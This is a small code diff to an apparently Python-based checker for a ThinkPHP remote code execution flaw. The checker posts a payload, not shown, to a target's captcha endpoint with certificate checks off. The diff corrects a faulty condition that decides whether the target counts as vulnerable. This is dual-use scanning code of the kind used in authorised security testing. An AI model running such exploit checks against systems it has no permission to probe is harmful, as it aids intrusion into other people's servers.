@@ -27,7 +27,7 @@ def thinkphp_construct_code_exec_verify(url):
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=captcha')
         req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
-        if r"string(32)" and r"56540676a129760a3ea" in req.text:
+        if r"string(32)" in req.text and r"56540676a129760a3ea" in req.text:
             pocdict['isvul'] = True
             pocdict['vulnurl'] = vurl
             pocdict['payload'] = payload
